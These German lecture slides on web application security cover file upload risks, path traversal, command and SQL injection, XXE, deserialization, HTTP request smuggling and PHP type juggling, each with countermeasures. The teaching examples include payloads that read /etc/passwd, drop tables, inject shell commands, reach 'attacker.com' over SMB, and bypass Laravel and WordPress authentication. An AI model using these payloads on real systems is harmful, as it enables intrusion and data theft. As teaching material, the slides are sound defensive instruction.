---
author: Andreas Happe
title: Web Security
--- 

# File Uploads

## Umfeld

* Benutzer kann Dateien hochladen
* Benutzer kann Dateien wieder herunterladen bzw. auf Dateien zugreifen
* (Dateien werden server-seitig gelesen)

## Das upload-Verzeichnis: public

* in diesem Verzeichnis werden Dateien abgelegt
* schlechtes Beispiel: /var/www/upload
* Problem: web-server vs app-server (authentication/authorization)
* Problem: Uploads werden dadurch Teil der Applikation
* Dateitypen begrenzen (keine HTML-Files)
* Niemals Dateinamen durch User bestimmen lassen

## Bessere Lösung

* Lösung: getrenntes Download-Verzeichnis (oder BLOBS)
* Ausserhalb des Webroots
* Download-Operation download.php?id=123 mit auth

## Upload von malicious files

* Backdoors, z. B. als PHP Dateien
* Integration von Virenscanner? Auf Filesystem-Ebene problematisch für Applikation

## Upload von HTML Files

* Wenn ein HTML-File hochgeladen und danach betrachtet wird, hat inkludierter JavaScript Code Zugriff auf Cookies, etc.
* Content-Disposition (download-only)
* X-Content-Type-Options Header

## Best Practises

* Dateitypen begrenzen
* Getrenntes Upload-Verzeichnis, ausserhalb vom Webroot
* Don’t use user-supplied filenames
* Overwrite nicht erlauben
* Verwendung eines Malware/Viren-Scanners
* Bei download Zugriffsberechtigungen beachten!

## Architecure: Sandboxing

* Wenn man unbedingt user-supplied Daten bearbeiten muss, z. B. Bildbearbeitung
* Separation of Duties: Bearbeitung in eigener Komponente
* Diese Komponente läuft gesandboxed oder auf einer eigenen VM
* Microservices?

# Path Traversals

## Path Traversals: Grundsituation

* Annahme Operation: /var/www/GetImage.jsp
* https://opfer.local/GetImage.jsp?file=diagram.jpg
* Zugriff auf Datei /var/www/diagram.jpg


## Trying to get out of WebRoot

```
Parameter: ./../../../../etc/passwd
/var/www/./../../../../etc/passwd
-> /etc/passwd
```

## Path Traversals: Gegenmaßnahmen

* Nicht benutzer-übergebene Dateinamen beim Zugriff verwenden
* immer den kanonischen Pfad berechnen und verwenden
* whitelisten von Download-Verzeichnis (Achtung bei NULL-Characters, etc.)
* Einsatz von Sandboxes und Chroots

# Injection Attacks

## Grundproblem

* Garbage In/Garbage Out
* Never trust user (input)
* Switch von Daten-Context auf Befehls-Context
  * Ausführung mit Web-App oder Datenbank-Rechten
  * kann auch auf nicht-Webservern passieren

## Wie zu testen?

* Gut automatisiert testbar
  * Web Application Security Scanner
  * Tools für Spezialbereiche wie SQLi
 
## Problem: große Angriffsfläche

* Computer Game Maps (CS, SC)
* Flickr-Javascript Injection
* QR-Codes / Nummerntaffeln

## Lösung

* Überprüfung aller Eingaben
  * immer mit Bibliotheken da zu viele Möglichkeiten

* Quoting der Ausgaben/bei der Verwendung
  + teilweise automatisch durch Frameworks

* Sandboxing
  * to minimize impact

# Command Injections

## Allgemein

* Eine Web-Operation bietet eine Operation an
* diese wird über ein Systemkommando breitgestellt
* Angreifer versucht das Kommando zu "überladen"..
* .. und kann dadurch "eigene" Kommandos ausführen
* use-case: mit netcat eine Session/Listener aufmachen

## Beispiel: Router mit Ping

http://192.168.1.1/test_connectivity?domain=www.snikt.net

``` python
import os
domain = user_input()
os.system('ping ' + domain)
```

```
# Versuche mit:
;ls
$(ls)
`ls`
```

## Beispiel: TP-Link Router

* [Flash Instruction](https://openwrt.org/toh/tp-link/tl-wr703n)

## Wie werden Dateien gelesen?

Gedacht:

``` url
http://sensitive/cgi-bin/userData.pl?doc=user1.txt
```

Versuche mit

```
http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|
http://sensitive/something.php?dir=%3Bcat%20/etc/passwd
```

## Gefährliche Funktionen

* Java
  * Runtime.exec(), getRuntime.exec(), ProcessBuilder.start()
* PHP
  * system, shell_exec, exec, proc_open, eval, passthru, proc_open, expect_open, ssh2_exec, popen
* Python
  * exec, eval, os.system, os.popen, subprocess.popen, subprocess.call

## Lösung

* Bibliotheken statt Kommandozeilenaufrufe verwenden
* z.B. Netzwerkbibliotheken statt ping aufrufen


# SQL-Injections

## Grundproblem (OWASP)

``` 
SQL injection errors occur when:
  * Data enters a program from an untrusted source.
  * The data used to dynamically construct a SQL query
```

## SQL: very basics

``` SQL
select column1, column2 from table1, table2
where column1 = ‘xyz’
order by column1 asc/desc
limit 1;
```

## SQL: UNION select

``` SQL
select column1, column22 from table1, table2
where conditions
order by column1 asc/desc
union all
select column3, column4 from table4, table5;
```

## SQL Injection Attacks

## Simples Beispiel

* Kino-Portal:
* Login: https://kino.local/login.php?username=ah&password=pw

Hintergrund: SQL Operation wird mit String Concat gebaut

``` Java
query = "select * from users ";
query = query + "where username = " +username;
query = query + " and password = " +password +’ limit 1;
```

## Simples Beispiel

Angreifer wählt Passwort:

```
1’ or ‘1’=’1
```

Ergebnis:

``` SQL
select * from users 
where username = ‘ah‘ and password = ‘1’ or ‘1’ = ‘1’ limit 1;
```

## Stacked Queries

* URL: http://snikt.net/test.php?id=1
* Operation: select * from articles where id=1

``` SQL
# Eingabe
`1; drop table users; --

# Ergebnis
select * from articles wehre id=1;drop table users;--
```

## Union-Based SQLi

* Weboberfläche
* Ergebnis wird in einer Tabelle angezeigt

```
# Datenquelle:
select Name, Phone, Address FROM users where user_id=1
```

## Versuch mehr Daten zu extrahieren

* Spaltenanzahl erraten

* Folgende Eingabe fuer id:

```
  1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

## Union-Based SQLi: Ergebnis:

``` sql
SELECT Name, Phone, Address FROM Users WHERE Id=1
UNION ALL
SELECT creditCardNumber,1,1 FROM CreditCardTable
```

## Error-based SQLi

Eine Datenbank-Fehlermeldung wird als Rückkanal verwendet

``` sql
select * from table where id = (select username, password from users);

# fehlermeldung:
Cannot compare id (integer) with ["root", "password"]
```

## Beispiel: Boolean-based blind SQLi

* URL: http://snikt.net/show_product?id=1
* Query: select * from product where id = 1;

## Oracle wird festgestellt:

``` sql
# id: "1 or 1=0" -> Produkt wird angezeigt
select * from products where id=1 or 1=0;

# id: "1 and 1=0" -> Kein Produkt wird angezeigt
select * from products where id=1 and 1=0;
```

## Beispiel: auslesen der ersten Stelle eines Benutzernamens

``` sql
SELECT field1, field2, field3
FROM Users
WHERE Id=1 AND ASCII(SUBSTRING(username,1,1))=97
```

## Bespiel: time-based SQLi

* Kein Antwortkanal verfügbar
* Eigentlich ein Side-Channel Attack über Timing
* Operation: http://www.example.com/product.php?id=10

``` sql
# id: "10 AND.."
select * from products where id=10
AND IF(version() like ‘5%’, sleep(10), ‘false’))--
```

## Tooling: SQLMap

* Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, HSQLDB and H2 database management systems.
* Full support for five SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based and stacked queries.

## Problem: Database-Escape

* MySQL, PostgreSQL und MSSQL erlauben es, Kommandos ausgehend von SQL auszuführen
* z. B. xp_cmdshell bei MSSQL

Postgresql (user muss db admin sein)

``` sql
postgres-# CREATE TABLE temp(t TEXT);
postgres-# COPY temp FROM '/etc/passwd';
postgres-# SELECT * FROM temp limit 1 offset 0;
```

## Gegenmaßnahmen

## Gegenmaßnahme: Prepared Statement

```java
String custname = request.getParameter("customerName");
String query = "SELECT account_balance FROM user_data WHERE user_name = ? ";

PreparedStatement pstmt = connection.prepareStatement( query );

pstmt.setString( 1, custname);

ResultSet results = pstmt.executeQuery( );
```

## Gegenmaßnahme: Prepared Statements

``` php
$id = 1;
$sth = $DBH->prepare("SELECT * FROM juegos WHERE id = :id");
$sth->bindParam(':id', $id, PDO::PARAM_INT);
$STH->execute();
```

## Gegenmaßnahme: prepared statements

* Achtung: einige Felder können nicht mittels Stored Procedures abgebildet werden:
  * Tabellennamen
  * Spaltennamen
  * ASC/DESC
* In dem Fall: Whitelisting oder Query umbauen
* Vorteil von prepared statements: Logik bleibt in der Applikation

## Gegenmaßnahme: Escape Input Data

* Last-Resort
* Error-Prone
* Datenbank-spezifisch

## Stored Procedures?

* Können sicher sein, weil stored procedures meistens prepared statements verwenden
* Es gibt aber auch die Möglichkeit eines evals, deswegen muss man den stored procedure code ebenso testen

## ORMs sind automatisch sicher?

Am Beispiel sqlize

``` javascript
# example
models.Items.findAll({
  limit: '1',
})

# not so perfect
models.Items.findAll({
  limit: '1; DROP TABLE Items; --',
})
```

## NoSQL? MongoDB

``` javascript
# example
db.myCollection.find({
  active: true,
  $where: function() {
    return obj.credits - obj.debits < $userInput;
  }
});;
``` 

## NoSQL: Attack pattern

``` javascript
# attack: $userInput auf folgenden Wert setzen
(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()

# schöner formattiert
(function(){
  var date = new Date();
  do{ curDate = new Date();}while(curDate-date<10000);
  return Math.max();
})()
```

# XML External Entities

## Grundproblem

* XML Dateien müssen serverseitig bearbeitet werden
* XML Parser sind komplex
* Es können Remote Ressourcen eingebunden werden

## Beispiel: reading files

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

## Beispiel: reading Shares

Es werden die Token des aktuellen Benutzers verwendet.

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "smb://www.attacker.com" >]>
<foo>&xxe;</foo>
```


## Beispiel: reading URLs

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://www.seite-gegen-das-verbotsgesetz.com/text.txt" >]>
<foo>&xxe;</foo>
```

## Beispiel: reading URLs

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://192.168.0.1/admin/do-something" >]>
<foo>&xxe;</foo>
```

## Beispiel: reading URLs

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/do-something" >]>
<foo>&xxe;</foo>
```

## If lucky: PHP Expect Module

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

## Gegenmaßnahmen

* JSON/CSV sind keine "wirklichen" Alternativen
* Im Parser External Entities deaktivieren
* Wissen, wie der Parser funktioniert..

## Million Laughter Attacks

* DoS-Angriff gegenüber dem Speicher (RAM)
* Meistens über “explodierende” Strukturen
* [XML Security Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_Security_Cheat_Sheet.md)

# Serilization Attacks

## Was ist Serialisierung

![Picture](0x08_serialization.jpg){.stretch}

## Grundidee Angriff

* Angreifer modifiziert das serialisierte Objekt
* ..bringt den Deserialisierer zum Abstürzen
* ..kann das deserialisierte Objekt modifizieren
* ..kann potentiell Code ausführen

## Client-Side State

Am Beispiel [PHP](http://www.phpinternalsbook.com/php5/classes_objects/serialization.html)

```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}

# attack
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:5:"admin"; i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

## Java Serialization Attack

* Problem: Objekt wird erst deserialisiert und danach erst überprüft
* Falls ein Fehler bei der Deserialiserung passiert, dann wird dies zu spät abgefangen

``` Java
InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
AcmeObject acme = (AcmeObject)ois.readObject();
```

## Java Serilization Attack

``` Java
Set root = new HashSet();
Set s1 = root;
Set s2 = new HashSet();
for (int i = 0; i < 100; i++) {
  Set t1 = new HashSet();
  Set t2 = new HashSet();
  t1.add("foo"); // make it not equal to t2
  s1.add(t1);
  s1.add(t2);
  s2.add(t1);
  s2.add(t2);
  s1 = t1;
  s2 = t2;
}
```

## Schlimmer: Code Execution

* Über das deserilisierierte Objekt wird Code executed
* Die verwendete Klasse muss im Zielsystem bekannt sein
* Meistens werden Konstruktoren von häufigen Bibliotheken verwendet
* Liste von Vektoren, z. B. [ysoserial](https://github.com/frohoff/ysoserial)

## Ruby on Rails Serilialisierung

```ruby
code  = File.read(ARGV[1])

# Construct a YAML payload wrapped in XML
payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
<fail type="yaml">
--- !ruby/object:ERB
  template:
      src: !binary |-
            #{Base64.encode64(code)}
	    </fail>
	    PAYLOAD
```

## Java Serialization Attack: Controls

* Deserialiseriung nicht verwenden
* Austauschen des Deserialisierers mit Custom Serializer (look-ahead)
* Serialiserungsoperationen müssen authenticated und authorized sein
* Serialisierte Objekte müssen integritätsgeschützt werden

# HTTP Request Smuggling

## About

* Angriff auf die "Infrastruktur"
* Kudos zu [PortSwigger](https://portswigger.net/web-security/request-smuggling)
* Community Mention 2019

## Normaler Ablauf

![Picture](0x08_revproxy.svg){.stretch}

## Angriff

![Picture](0x08_revproxy-desynced.svg){.stretch}

## HTTP Request Länge

Content-Length Header:

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

## Angriff (~2005):

``` http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345G
```

Might result in:
``` http
POST / HTTP/1.1
Host: example.com
Content-Length: 6
Content-Length: 5

12345GPOST / HTTP/1.1
Host: example.com
```

## This was fixed..

## HTTP Request Länge

"chunked" (0xb == 11):

``` http
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

## Angriff (~2019):

CL -> TE

``` http
 POST / HTTP/1.1
 Host: vulnerable-website.com
 Content-Length: 13
 Transfer-Encoding: chunked

 0

 SMUGGLED 
 ```

## Angriff (~2019):

TE -> CL

``` http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Angriff (~2019) 

TE -> TE

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## But what to do with that

## But what to do with that

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 324

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

## Results in

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

## Gegenmassnahmen

* Jeden Backend-Request über eine eigene Connection schicken
* Backend und Frontend müssen den gleichen Längen-Identifier verwenden
* HTTP/2 verwenden

# PHP Type Juggling

## Vergleichsoperator ===

![Picture](0x09_type_juggling_1.png){.stretch}

## Vergleichsoperator ==

![Picture](0x09_type_juggling_2.png){.stretch}

## Hint

* es gibt auch != und !==

## Fun Examples

``` php
TRUE: "0000" == int(0)
TRUE: "0e12" == int(0)
TRUE: "1abc" == int(1)
TRUE: "0abc" == int(0)
TRUE: "abc"  == int(0) // !!
TRUE: "0e12345" == "0e54321"
TRUE: "0e12345" <= "1"
TRUE: "0e12345" == "0"
TRUE: "0xF"     == "15"
```

## Exploit 1 (Larabel CSRF-Bypass)

``` php
if (Session::token() != Input::get('_token')) {
   throw new Illuminate\Session\TokenMismatchException;
}
// authenticated operation
```

Token: Random-String, in 85% der Fälle mit 0 oder Buchstaben als erstes Zeichen

## Exploit 1 (Larabel CSRF-Bypass)

Exploit:
```
$.ajax("http://<laravel app>/sensitiveaction", {
	type: 'post',
	contentType: 'application/x-www-form-urlencoded; charset=UTF-8; /json',
	data: '{"sensitiveparam": "sensitive", "_token": 0}',});
```

## Exploit 2 (Wordpress Auth Bypass)

``` php
# Cookie vom Browser:
# beinhaltet: $hmac, $user, $expiration

# serverseitiger Check
if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
  // authenticated operation
}
```

## Attack

``` php
cookie: set $hmac=0, $user=admin
brute-force over expiration
hash_mac('md5', "admin"."|"."some-date", $key) -> "some-hash.."
```

``` php
if ($hmac == hash_hmac('md5', $user .'|'. $expiration, $key)) {
  // authenticated operation
}
```

``` php
# What if hash looks like "0eabcdefg" and $hmac is set to "0"
if ("0" == "0eabcdefg") { // transforms to "0" == "0"
   // authenticated operation
}
```

# FIN
